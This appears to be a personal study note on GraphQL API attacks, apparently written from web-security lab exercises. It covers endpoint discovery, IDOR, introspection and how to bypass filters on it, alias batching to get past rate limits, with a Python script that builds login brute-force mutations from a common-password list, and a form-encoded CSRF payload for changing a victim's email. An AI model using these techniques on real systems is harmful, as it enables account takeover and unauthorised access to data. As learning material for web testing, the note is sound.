![[GraphQL APIs.jpg]]
# Recon

Before testing a GraphQL API, you need to find its endpoint.

If you send `query{__typename}` to any GraphQL endpoint, it will include the string `{"data": {"__typename": "query"}}` somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.

The query works because every GraphQL endpoint has a reserved field called `__typename` that returns the queried object's type as a string.

GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

>[!info]
>If these common endpoints don't return a GraphQL response, you could also try appending `/v1` to the path. GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error.

It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of `application/json`, as this helps to protect against CSRF vulnerabilities. However, some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of `x-www-form-urlencoded`.

If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods.
# Exploiting Unsanitized Arguments

If API uses arguments to access objects directly, a user could access information by supplying an argument that corresponds to that information - known as IDOR. A query may request a product list:

```json
    #Example product query
    query {
        products {
            id
            name
            listed
        }
    }
```

The list contains only listed products:

```json
 #Example product response
    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
    }
```

It shows products have an ID and some are missing (i.e. 3). By querying missing IDs, the details can be grabbed:

```json
    #Query to get missing product
    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```

```json
    #Missing product response
    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }
```

Attempt to run an Introspection query to find any hidden fields are available, particularly for hidden blog posts. If true, add the hidden fields to the initial query to grab the value.
# Discover Schema Information

Introspection is a built-in GraphQL function that allows you to query for information about the schema, but can also be used to disclose potentially sensitive data. To use it, query the `__schema` field, available on root type of all queries.

Probe for introspection using a simple query. If enabled, the response includes names of all available queries:

```json
    #Introspection probe request
    {
        "query": "{__schema{queryType{name}}}"
    }
```

>[!info]
>Burp Scanner automatically tests for introspection during scans, reporting as "GraphQL introspection enabled".

Run a full query against the endpoint to gain full details on all queries, mutations, subscriptions, types, and fragments:

```json
#Full introspection query
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }
    
    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

>[!info]
>You may have to remove the onOperation, onFragment and onField directives as some endpoints do not accept them as part of introspection queries.

Suggestions can be used to gather info on the structure. They're a feature of Apollo GraphQL where the server suggests query amendments in errors - generally used when query is incorrect but recognizable. [Clairvoyance](https://github.com/nikitastupin/clairvoyance) tool can be used to automatically recover all or part of a GraphQL schema.

Try to run an introspection query in Repeater by right-clicking and choosing "Set introspection query". Search for any hidden values or fields that are not sent by default and modify the original GraphQL query to include that field - it may include sensitive information.

If there is a ton of schema information, right click the request and "Save GraphQL queries to site map" to better understand the individual queries. If any query allows sending of a guessable ID (e.g. id=1), try fuzzing the value to potentially extract sensitive information.
# Bypass Introspection Defenses

If introspection is disabled, insert a special character after the `__schema` keyword. Attempt to bypass the regex of excluding `__schema` in queries via spaces, newlines and commas since they are ignored by GraphQL but not by flawed regex:

```json
    #Introspection query with newline
    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```

Attempt to run a probe over an alternative method as well such as GET or POST request with a content of `x-www-form-urlencoded`.

```json
    # Introspection probe as GET request
    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

If the GraphQL endpoint is hidden, attempt to find it using various common endpoints (/api, /graphql, etc..). If found, send a universal query:

```json
query=query{__typename}
```

>[!info]
>Try sending it as both a GET request (query=.....) and a POST request.

Attempt various endpoint bypasses such as newlines (%0A). spaces (%20) or commas (%2c). 
# Bypass Rate Limiting

Aliases allow you to bypass multiple properties with the same name restriction by naming the properties you want to return. Aliases can return multiple instances of the same type of object in one request. Aliases can brute force a GraphQL endpoint.

Some rate limiters work based on the number of requests received rather than number of operations. Since aliases are multiple queries in one message, it can bypass it. An example is checking if store discounts are valid:

```json
    #Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```

Analyse the login requests and note that it uses a mutation to send a login request with a username and password. Craft a query that contains multiple login mutations in one message:

```json
mutation {
        attack0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }
          attack1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }
          attack2:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }
```

To create all 99 logins faster, create a simple Python script:

```python
passwords = """123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,
monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,
000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,
sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,
jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,
amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,
mobilemail,mom,monitor,monitoring,montana,moon,moscow""".replace("\n", "").split(',')

graphql_queries = []

# Generate the GraphQL query aliases
for index, password in enumerate(passwords):
    query = f"""
    attack{index}: login(input: {{password: "{password}", username: "carlos"}}) {{
        token
        success
    }}
    """
    graphql_queries.append(query)

# Join all the queries into one string with newlines separating each query
final_query = "\n".join(graphql_queries)

# Output the generated GraphQL query string
print(final_query)
```
# GraphQL CSRF

GraphQL can allow a CSRF attack to take place whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim. 

>[!info]
>POST requests that are JSON are secure as long as the content type is validated.

Alternative methods like GET or a request that uses `x-www-form-urlencoded` can be sent by a browser. Attackers can craft malicious requests to send to the API. 

Try to observe any sensitive functionality (changing email, updating account information, etc...). Attempt to change the request method to `application/x-www-form-urlencoded` either manually or by "Change request method" twice.

As an example, a standard email change request may be:

```json
{
  "query": "\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n",
  "operationName": "changeEmail",
  "variables": {
    "input": {
      "email": "attacker@test.net"
    }
  }
}
```

After changing the request method, add it back as non-JSON data:

```json
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

Which decodes to:

```json
query=
    mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }
&operationName=changeEmail&variables={"input":{"email":"hacker@hacker.com"}}
```

>[!info]
>Make sure not to encode the "=" characters.

If it works successfully, send the CSRF PoC successfully to the victim, making sure to change the email to a different one that tested.




